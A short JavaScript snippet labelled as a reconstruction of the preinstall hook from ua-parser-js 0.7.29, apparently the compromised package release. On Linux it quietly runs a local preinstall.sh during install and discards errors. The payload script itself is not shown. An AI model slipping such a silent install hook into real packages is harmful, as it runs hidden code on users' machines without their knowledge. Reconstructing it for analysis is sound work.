// Reconstruction of ua-parser-js 0.7.29 preinstall.js: pick the platform script.
const { execSync } = require("child_process");
const os = require("os");
if (os.type() === "Linux") {
  try { execSync("sh preinstall.sh", { stdio: "inherit" }); } catch (e) {}
}
